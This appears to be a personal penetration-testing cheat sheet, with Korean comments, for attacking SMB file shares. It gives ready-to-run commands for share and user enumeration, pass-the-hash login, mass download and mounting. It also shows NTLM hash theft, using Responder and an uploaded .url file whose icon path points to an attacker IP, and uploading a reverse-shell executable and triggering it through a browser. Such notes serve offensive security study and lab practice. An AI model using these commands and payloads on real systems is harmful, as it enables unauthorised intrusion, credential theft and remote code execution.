## Tools

- smbclient
- smbmap
- netexec
- enum4linux

### Nmap

```bash
nmap $IP -sV --script=smb-enum-shares.nse,smb-enum-users.nse -p 139,445 
nmap $IP -sV --script=vuln -p 139,445
```

### smbclient

```bash
smbclient -N -L //$IP
smbclient //$IP/$SHARE/
smbclient //$IP/$SHARE/ -U '$USER%$PWD'
# PtH
smbclient //$IP/$SHARE/ -U Administrator --pw-nt-hash $NTLM_HASH

# Read files in smbclient
more [file]
```

### smbmap

```bash
smbmap -H $IP
smbmap -H $IP-r $SHARE
smbmap -H $IP -u [user] -p [pwd] -d [domain]
smbmap -H $IP -u [user] -p [pwd] -d [domain] -R '[dir-name]' --dir-only
smbmap -H $IP --download "$SHARE\$FILE"
smbmap -H $IP --upload $FILE "$SHARE\$FILE"
```

## File Download

```bash
prompt OFF # 다운로드 여부를 파일 마다 개별적으로 묻는 설정 끄기
recurse ON # 재귀적으로 다운로드
mget *

# 너무 많으면 그냥 share 마운트가 더 용이함
sudo mount -t cifs //$IP/share share/ -o guest
sudo mount -t cifs //$IP/share share/ -o guest,port=$PORT
```

## Steal Hash

```bash
# Option 1: If you can upload files, try running responder and steal hash
sudo responder -I tun0
put [file.txt]
```

```bash
# Option 2:
sudo vim wook.url
# inside the file
[InternetShortcut]
URL=whatever
workingDirectory=whatever
IconFile=\\[Attacker_IP]\%USERNAME%.icon
IconIndex=1
# Upload the file
put wook.url
```

## Mount

```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=wook,password=wook,domain=. //$IP/Finance /mnt/Finance
sudo mount -t cifs -o guest //$IP/Finance /mnt/Finance
sudo mount -t cifs -o credentials=/path/credentialfile

# The file credentialfile has to be structured like this
username=wook
password=wook
domain=.
```

## Reverse shell

SMB share가 브라우저에 접근 가능한지 확인 후 페이로드 실행

```bash
# SMB share에 put으로 리버스 쉘 페이로드 업로드
smb/> put reverseshell.exe

# 브라우저에서 실행
10.10.218.16/<share>/reverseshell.exe
```